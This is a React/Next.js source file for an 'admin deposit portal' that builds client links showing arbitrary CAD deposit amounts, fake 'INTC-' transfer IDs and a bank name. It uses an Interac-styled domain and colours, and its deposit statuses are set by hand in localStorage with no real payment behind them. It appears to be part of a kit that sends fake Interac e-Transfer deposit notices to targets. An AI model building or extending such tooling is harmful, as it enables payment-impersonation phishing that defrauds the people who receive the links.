"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  ArrowLeft,
  DollarSign,
  Users,
  Clock,
  CheckCircle,
  AlertCircle,
  Copy,
  ExternalLink,
  ChevronDown,
  ChevronUp,
  Eye,
  EyeOff,
  Send,
  RefreshCw,
  Loader2,
  Link,
  Trash2,
} from "lucide-react"
import Header from "@/components/Header"
import { useAuth } from "@/lib/auth/context"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"

interface DepositRecord {
  id: string
  transferId: string
  amount: string
  recipient: string
  recipientName: string
  bankName: string
  message: string
  timestamp: string
  status: "pending" | "completed" | "failed" | "expired"
}

function formatAmount(val: string | number) {
  const n = typeof val === "string" ? parseFloat(val) : val
  if (isNaN(n)) return "0.00"
  return n.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })
}

function timeAgo(iso: string) {
  const diff = Date.now() - new Date(iso).getTime()
  const m = Math.floor(diff / 60000)
  if (m < 1) return "just now"
  if (m < 60) return `${m}m ago`
  const h = Math.floor(m / 60)
  if (h < 24) return `${h}h ago`
  return `${Math.floor(h / 24)}d ago`
}

const STATUS_STYLES: Record<string, string> = {
  pending:   "bg-amber-500/10 text-amber-400 border border-amber-500/20",
  completed: "bg-green-500/10 text-green-400 border border-green-500/20",
  failed:    "bg-red-500/10 text-red-400 border border-red-500/20",
  expired:   "bg-zinc-700/50 text-zinc-400 border border-zinc-700",
}

export default function AdminDepositPortal() {
  const { user, isLoading: authLoading } = useAuth()
  const router = useRouter()

  // Custom amount composer
  const [customAmount, setCustomAmount]         = useState("")
  const [customRecipient, setCustomRecipient]   = useState("")
  const [customName, setCustomName]             = useState("")
  const [customMessage, setCustomMessage]       = useState("")
  const [generatedLink, setGeneratedLink]       = useState("")
  const [copiedLink, setCopiedLink]             = useState(false)

  // Deposit history from localStorage (client-submitted deposits)
  const [deposits, setDeposits]                 = useState<DepositRecord[]>([])
  const [showAmounts, setShowAmounts]           = useState<Record<string, boolean>>({})
  const [expandedId, setExpandedId]             = useState<string | null>(null)
  const [isRefreshing, setIsRefreshing]         = useState(false)

  // Auth guard
  useEffect(() => {
    if (!authLoading && !user) {
      router.replace("/login")
    }
  }, [authLoading, user, router])

  // Load deposits from localStorage
  const loadDeposits = () => {
    setIsRefreshing(true)
    try {
      const raw = localStorage.getItem("depositHistory")
      const parsed: DepositRecord[] = raw ? JSON.parse(raw) : []
      setDeposits(parsed)
    } catch {
      setDeposits([])
    }
    setTimeout(() => setIsRefreshing(false), 400)
  }

  useEffect(() => { loadDeposits() }, [])

  const generateLink = () => {
    const amountNum = parseFloat(customAmount.replace(/,/g, ""))
    if (!customAmount || isNaN(amountNum) || amountNum <= 0) return
    const transferId = `INTC-${Math.floor(100000 + Math.random() * 900000)}-${Date.now().toString().slice(-4)}`
    const params = new URLSearchParams({
      transferId,
      amount: amountNum.toString(),
      recipient:     customRecipient,
      recipientName: customName,
      bankName:      "QuantumYield",
      message:       customMessage,
      timestamp:     new Date().toISOString(),
    })
    const base = typeof window !== "undefined" ? window.location.origin : "https://interac.quantumyield.digital"
    setGeneratedLink(`${base}/deposit-portal/client?${params.toString()}`)
  }

  const copyLink = () => {
    if (!generatedLink) return
    navigator.clipboard.writeText(generatedLink)
    setCopiedLink(true)
    setTimeout(() => setCopiedLink(false), 2000)
  }

  const updateStatus = (id: string, status: DepositRecord["status"]) => {
    const updated = deposits.map((d) => d.id === id ? { ...d, status } : d)
    setDeposits(updated)
    localStorage.setItem("depositHistory", JSON.stringify(updated))
  }

  const deleteRecord = (id: string) => {
    const updated = deposits.filter((d) => d.id !== id)
    setDeposits(updated)
    localStorage.setItem("depositHistory", JSON.stringify(updated))
  }

  const toggleAmount = (id: string) =>
    setShowAmounts((p) => ({ ...p, [id]: !p[id] }))

  const stats = {
    total:     deposits.length,
    pending:   deposits.filter((d) => d.status === "pending").length,
    completed: deposits.filter((d) => d.status === "completed").length,
    volume:    deposits.reduce((sum, d) => sum + (parseFloat(d.amount) || 0), 0),
  }

  if (authLoading) {
    return (
      <div className="min-h-screen bg-zinc-950 flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-[#FDB913]" />
      </div>
    )
  }

  if (!user) return null

  return (
    <div className="min-h-screen bg-zinc-950">
      <Header />

      <main className="max-w-6xl mx-auto px-4 py-6 space-y-8">

        {/* Page header */}
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div className="flex items-center gap-3">
            <button
              onClick={() => router.push("/dashboard")}
              className="w-9 h-9 flex items-center justify-center rounded-xl bg-zinc-800 hover:bg-zinc-700 transition-colors"
            >
              <ArrowLeft className="w-4 h-4 text-zinc-400" />
            </button>
            <div>
              <h1 className="text-xl font-bold text-white leading-tight">Deposit Portal</h1>
              <p className="text-xs text-zinc-500">Admin view — full access</p>
            </div>
          </div>
          <span className="px-3 py-1 bg-[#FDB913] text-black text-xs font-bold rounded-lg">ADMIN</span>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {[
            { label: "Total Deposits", value: stats.total, icon: Users, color: "text-zinc-300" },
            { label: "Pending",        value: stats.pending, icon: Clock, color: "text-amber-400" },
            { label: "Completed",      value: stats.completed, icon: CheckCircle, color: "text-green-400" },
            { label: "Total Volume",   value: `$${formatAmount(stats.volume)} CAD`, icon: DollarSign, color: "text-[#FDB913]" },
          ].map(({ label, value, icon: Icon, color }) => (
            <div key={label} className="bg-zinc-900 border border-zinc-800 rounded-xl p-4">
              <div className="flex items-center gap-2 mb-2">
                <Icon className={`w-4 h-4 ${color}`} />
                <span className="text-xs text-zinc-500">{label}</span>
              </div>
              <p className={`text-lg font-bold ${color}`}>{value}</p>
            </div>
          ))}
        </div>

        {/* Custom amount link composer */}
        <section className="bg-zinc-900 border border-zinc-800 rounded-2xl p-6 space-y-5">
          <div className="flex items-center gap-3 pb-4 border-b border-zinc-800">
            <div className="w-9 h-9 rounded-xl bg-[#FDB913]/10 flex items-center justify-center">
              <Link className="w-4 h-4 text-[#FDB913]" />
            </div>
            <div>
              <h2 className="text-sm font-semibold text-white">Generate Client Deposit Link</h2>
              <p className="text-xs text-zinc-500">Create a custom deposit portal URL to send to a client</p>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="space-y-1">
              <label className="text-xs font-medium text-zinc-400">Amount (CAD) *</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-zinc-500 font-semibold">$</span>
                <Input
                  type="number"
                  min="1"
                  step="0.01"
                  placeholder="1,500.00"
                  value={customAmount}
                  onChange={(e) => setCustomAmount(e.target.value)}
                  className="bg-zinc-800 border-zinc-700 text-white pl-7 text-base"
                />
              </div>
            </div>
            <div className="space-y-1">
              <label className="text-xs font-medium text-zinc-400">Recipient Email</label>
              <Input
                type="email"
                placeholder="client@example.com"
                value={customRecipient}
                onChange={(e) => setCustomRecipient(e.target.value)}
                className="bg-zinc-800 border-zinc-700 text-white text-base"
              />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-medium text-zinc-400">Recipient Name</label>
              <Input
                placeholder="John Doe"
                value={customName}
                onChange={(e) => setCustomName(e.target.value)}
                className="bg-zinc-800 border-zinc-700 text-white text-base"
              />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-medium text-zinc-400">Message / Memo</label>
              <Input
                placeholder="Optional memo"
                value={customMessage}
                onChange={(e) => setCustomMessage(e.target.value)}
                className="bg-zinc-800 border-zinc-700 text-white text-base"
              />
            </div>
          </div>

          <Button
            onClick={generateLink}
            disabled={!customAmount || parseFloat(customAmount) <= 0}
            className="bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold h-11 w-full md:w-auto px-8"
          >
            <Send className="w-4 h-4 mr-2" />
            Generate Link
          </Button>

          {generatedLink && (
            <div className="space-y-3 pt-4 border-t border-zinc-800">
              <p className="text-xs font-semibold text-zinc-400 uppercase tracking-wider">Generated Client Link</p>
              <div className="flex items-stretch gap-2">
                <div className="flex-1 bg-zinc-800 border border-zinc-700 rounded-lg px-3 py-2.5 font-mono text-xs text-zinc-300 overflow-x-auto whitespace-nowrap">
                  {generatedLink}
                </div>
                <button
                  onClick={copyLink}
                  className={`shrink-0 px-4 rounded-lg font-semibold text-sm transition-all ${
                    copiedLink ? "bg-green-500 text-white" : "bg-zinc-700 hover:bg-zinc-600 text-white"
                  }`}
                >
                  {copiedLink ? <CheckCircle className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                </button>
                <a
                  href={generatedLink}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="shrink-0 px-4 rounded-lg bg-zinc-700 hover:bg-zinc-600 text-white flex items-center justify-center"
                >
                  <ExternalLink className="w-4 h-4" />
                </a>
              </div>
            </div>
          )}
        </section>

        {/* Client deposit history */}
        <section className="bg-zinc-900 border border-zinc-800 rounded-2xl overflow-hidden">
          <div className="flex items-center justify-between px-6 py-4 border-b border-zinc-800">
            <div>
              <h2 className="text-sm font-semibold text-white">Client Deposits</h2>
              <p className="text-xs text-zinc-500 mt-0.5">Deposits submitted via portal links</p>
            </div>
            <button
              onClick={loadDeposits}
              disabled={isRefreshing}
              className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-400 hover:text-white text-xs font-medium transition-colors"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isRefreshing ? "animate-spin" : ""}`} />
              Refresh
            </button>
          </div>

          {deposits.length === 0 ? (
            <div className="text-center py-16 text-zinc-600">
              <AlertCircle className="w-8 h-8 mx-auto mb-3 opacity-40" />
              <p className="text-sm">No deposit records yet</p>
              <p className="text-xs mt-1">Records appear here when clients open a generated link</p>
            </div>
          ) : (
            <div className="divide-y divide-zinc-800">
              {deposits.map((dep) => (
                <div key={dep.id}>
                  {/* Row */}
                  <div
                    className="flex items-center gap-3 px-6 py-4 cursor-pointer hover:bg-zinc-800/40 transition-colors"
                    onClick={() => setExpandedId(expandedId === dep.id ? null : dep.id)}
                  >
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-semibold text-white text-sm truncate">
                          {dep.recipientName || dep.recipient || "Unknown recipient"}
                        </span>
                        <span className={`px-2 py-0.5 rounded-full text-xs font-medium ${STATUS_STYLES[dep.status]}`}>
                          {dep.status}
                        </span>
                      </div>
                      <p className="text-xs text-zinc-500 mt-0.5 truncate">
                        {dep.transferId} &bull; {timeAgo(dep.timestamp)}
                      </p>
                    </div>

                    <div className="flex items-center gap-3 shrink-0">
                      <div className="text-right">
                        <button
                          onClick={(e) => { e.stopPropagation(); toggleAmount(dep.id) }}
                          className="flex items-center gap-1.5 group"
                        >
                          <span className={`font-bold text-sm ${showAmounts[dep.id] ? "text-white" : "text-zinc-600"}`}>
                            {showAmounts[dep.id] ? `$${formatAmount(dep.amount)}` : "••••••"}
                          </span>
                          {showAmounts[dep.id]
                            ? <Eye className="w-3.5 h-3.5 text-zinc-500 group-hover:text-zinc-300" />
                            : <EyeOff className="w-3.5 h-3.5 text-zinc-500 group-hover:text-zinc-300" />
                          }
                        </button>
                        <span className="text-xs text-zinc-600 block">CAD</span>
                      </div>
                      {expandedId === dep.id
                        ? <ChevronUp className="w-4 h-4 text-zinc-500" />
                        : <ChevronDown className="w-4 h-4 text-zinc-500" />
                      }
                    </div>
                  </div>

                  {/* Expanded detail */}
                  {expandedId === dep.id && (
                    <div className="px-6 pb-5 bg-zinc-800/30 border-t border-zinc-800 space-y-4">
                      <div className="grid grid-cols-2 md:grid-cols-3 gap-4 pt-4">
                        <div>
                          <p className="text-xs text-zinc-500 mb-0.5">Amount</p>
                          <p className="text-sm font-semibold text-white">${formatAmount(dep.amount)} CAD</p>
                        </div>
                        <div>
                          <p className="text-xs text-zinc-500 mb-0.5">Recipient</p>
                          <p className="text-sm text-white">{dep.recipientName}</p>
                          <p className="text-xs text-zinc-500">{dep.recipient}</p>
                        </div>
                        <div>
                          <p className="text-xs text-zinc-500 mb-0.5">Bank</p>
                          <p className="text-sm text-white">{dep.bankName}</p>
                        </div>
                        {dep.message && (
                          <div className="col-span-2 md:col-span-3">
                            <p className="text-xs text-zinc-500 mb-0.5">Message</p>
                            <p className="text-sm text-white">{dep.message}</p>
                          </div>
                        )}
                        <div className="col-span-2 md:col-span-3">
                          <p className="text-xs text-zinc-500 mb-0.5">Timestamp</p>
                          <p className="text-xs font-mono text-zinc-400">{new Date(dep.timestamp).toLocaleString()}</p>
                        </div>
                      </div>

                      <div className="flex items-center gap-2 flex-wrap pt-2 border-t border-zinc-700">
                        <span className="text-xs text-zinc-500 mr-1">Mark as:</span>
                        {(["pending", "completed", "failed", "expired"] as const).map((s) => (
                          <button
                            key={s}
                            onClick={() => updateStatus(dep.id, s)}
                            className={`px-3 py-1 rounded-lg text-xs font-semibold transition-colors ${
                              dep.status === s
                                ? "bg-[#FDB913] text-black"
                                : "bg-zinc-700 text-zinc-400 hover:bg-zinc-600 hover:text-white"
                            }`}
                          >
                            {s.charAt(0).toUpperCase() + s.slice(1)}
                          </button>
                        ))}
                        <button
                          onClick={() => deleteRecord(dep.id)}
                          className="ml-auto flex items-center gap-1.5 px-3 py-1 rounded-lg bg-red-950/50 hover:bg-red-900/60 text-red-400 text-xs font-medium transition-colors"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          Delete
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </section>

      </main>
    </div>
  )
}
